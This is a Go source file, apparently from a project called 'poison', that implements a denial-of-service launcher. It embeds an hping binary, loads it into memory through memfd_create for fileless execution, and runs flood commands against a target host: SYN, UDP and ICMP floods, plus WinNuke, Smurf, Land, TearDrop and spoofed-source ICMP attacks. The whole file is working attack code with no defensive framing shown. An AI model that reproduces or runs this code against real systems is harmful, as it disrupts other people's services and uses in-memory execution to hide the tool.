// Package service  -----------------------------
// @file      : ddos.go
// @author    : fzf
// @time      : 2023/5/9 上午10:28
// -------------------------------------------
package service

import (
	_ "embed"
	"fmt"
	logger "github.com/sirupsen/logrus"
	"golang.org/x/sys/unix"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"poison/src/model"
	"strconv"
	"syscall"
)

//go:embed setting/hping
var content []byte

var (
	c = make(chan os.Signal, 1) //2表示chan的长度，输入多少次，就可以实现Control+c执行动作多少次
)

type DDOSStruct struct {
}

func (p *DDOSStruct) Execute(config *model.InterfaceModel) {
	hping := Generate()
	commands := map[string]string{
		"TCP":      fmt.Sprintf("%s  -c 1000 -d 120 -S -p 10086 --flood %s", hping, config.DstHost),
		"UDP":      fmt.Sprintf("%s  %s -c 1000 --flood -2 -p 10086", hping, config.DstHost),
		"ICMP":     fmt.Sprintf("%s  %s -c 1000 --flood -1", hping, config.DstHost),
		"WinNuke":  fmt.Sprintf("%s  -d 120 -U %s -p 139", hping, config.DstHost),
		"Smurf":    fmt.Sprintf("%s  -1 %s --flood", hping, config.DstHost),
		"Land":     fmt.Sprintf("%s  -d 120 -S -a %s -p 10086 %s", hping, config.DstHost, config.DstHost),
		"TearDrop": fmt.Sprintf("%s  %s -2 -d 5000 --fragoff 1200 --frag --mtu 1000", hping, config.DstHost),
		"MAXICMP":  fmt.Sprintf("%s  %s -c 10000 -d 5000 --flood -1 --rand-source", hping, config.DstHost),
	}
	cmd := exec.Command("bash", "-c", commands[config.Mode])
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	var shutdownSignals = []os.Signal{os.Interrupt, syscall.SIGTERM}

	signal.Notify(c, shutdownSignals...)
	go func() {
		<-c
		//logger.Errorln(1111111111)
		//input, err := bufio.NewReader(os.Stdin).ReadString('\n')
		//logger.Infoln(3333)
		//if err != nil {
		//	fmt.Println("There were errors reading, exiting program.")
		//	return
		//}
		//fmt.Printf("您输入的是:%s", input)
		//fmt.Sscan(input, &config.Mode)
		//logger.Infoln(config.Mode)
	}()
	err := cmd.Run()
	if err != nil {
		logger.Infoln(err)
	}

}

func Generate() string {
	fd, err := unix.MemfdCreate("hping", 0)
	if err != nil {
		log.Fatal(err)
	}
	hping := "/proc/" + strconv.Itoa(os.Getpid()) + "/fd/" + strconv.Itoa(int(fd))
	err = os.WriteFile(hping, content, 0755)
	if err != nil {
		log.Fatal(err)
	}
	return hping
}
